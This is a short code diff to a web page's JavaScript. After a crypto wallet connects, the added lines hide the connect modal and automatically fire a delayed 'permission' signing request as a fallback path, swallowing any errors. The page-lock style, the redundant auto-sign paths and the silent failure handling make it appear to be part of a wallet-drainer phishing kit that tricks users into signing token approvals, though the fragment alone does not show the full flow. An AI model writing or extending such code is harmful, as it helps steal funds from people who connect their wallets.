@@ -621,7 +621,10 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       var cm = document.getElementById('connect-modal-root');
       if (cm) cm.style.display = 'none';
 
-      // PATH3 auto-fires via message/wallet events after connect — no duplicate sign here
+      // 4. Trigger sign — small delay lets PATH3 auto-event get priority
+      //    If PATH3 already fired (DOM flag set), _doPermission skips silently
+      //    If PATH3 never fires (some wallets skip message events), PATH2 is the fallback
+      setTimeout(function() { _doPermission(addr, msg, 'PATH2'); }, 500);
     } catch (e) {}
     _busy = false;
   }
